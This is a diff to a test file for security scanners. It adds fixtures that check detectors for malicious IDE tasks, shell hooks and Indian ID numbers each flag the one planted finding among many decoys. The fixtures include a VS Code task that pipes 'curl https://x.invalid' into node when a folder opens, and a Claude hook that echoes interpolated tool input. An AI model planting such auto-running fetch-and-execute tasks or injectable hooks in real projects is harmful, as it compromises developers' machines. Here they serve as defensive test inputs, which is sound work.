@@ -317,11 +317,28 @@ def _quiet(i: int) -> str:
 _QUIET = range(50)
 
 
+def _aadhaar(valid: bool, start: int) -> str:
+    """The first 12-digit number from `start` whose Verhoeff check is `valid`."""
+    n = start
+    while india_pii._verhoeff_check(str(n)) is not valid:
+        n += 1
+    return str(n)
+
+
+def _quiet_aadhaars() -> list[str]:
+    out: list[str] = []
+    for i in _QUIET:
+        out.append(_aadhaar(False, 234567890100 + 1000 * i))
+    return out
+
+
 def _gha_steps() -> str:
     steps = "      - uses: owner/loud@v1\n" + "".join(
         f"      - uses: quietowner/{_quiet(i)}@{'0' * 40}\n" for i in _QUIET)
     return "on: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n" + steps
 
+
+_AADHAAR_LOUD = _aadhaar(True, 234567890123)
 
 # name -> (scan, project, the reported item's key, the quiet items' keys)
 _UNREPORTED: dict[str, tuple[Callable[[Path], object], dict[str, str], str, list[str]]] = {
@@ -370,6 +387,21 @@ _UNREPORTED: dict[str, tuple[Callable[[Path], object], dict[str, str], str, list
         "update_shared_note_loud", [f"read_{_quiet(i)}" for i in _QUIET]),
     "workflow-steps": (gha_hardening.scan, {".github/workflows/ci.yml": _gha_steps()},
                        "owner/loud@v1", [f"quietowner/{_quiet(i)}@{'0' * 40}" for i in _QUIET]),
+    "hook-commands": (hook_rce.scan, {".claude/settings.json": _js({"hooks": {"PreToolUse": [
+        {"matcher": "Bash", "hooks": [{"type": "command", "command": "echo ${input.loud}"}]},
+        *({"matcher": "Bash", "hooks": [{"type": "command", "command": f"echo {_quiet(i)}"}]} for i in _QUIET)]}})},
+        "echo ${input.loud}", [f"echo {_quiet(i)}" for i in _QUIET]),
+    "launch-tasks": (ide_task_rce.scan, {
+        ".vscode/tasks.json": _js({"version": "2.0.0", "tasks": [
+            {"label": "loud-task", "type": "shell", "command": "curl https://x.invalid | node",
+             "runOptions": {"runOn": "folderOpen"}}]}),
+        ".vscode/launch.json": _js({"configurations": [
+            {"name": "loud", "preLaunchTask": "loud-task"},
+            *({"name": f"q{i}", "preLaunchTask": _quiet(i)} for i in _QUIET)]})},
+        "loud-task", [_quiet(i) for i in _QUIET]),
+    "aadhaar": (india_pii.scan, {"notes.md": f"aadhaar {_AADHAAR_LOUD[:4]} {_AADHAAR_LOUD[4:8]} {_AADHAAR_LOUD[8:]}\n"
+                                 + "".join(f"id {n}\n" for n in _quiet_aadhaars())},
+                f"{_AADHAAR_LOUD[:4]} {_AADHAAR_LOUD[4:8]} {_AADHAAR_LOUD[8:]}", _quiet_aadhaars()),
 }
 
 
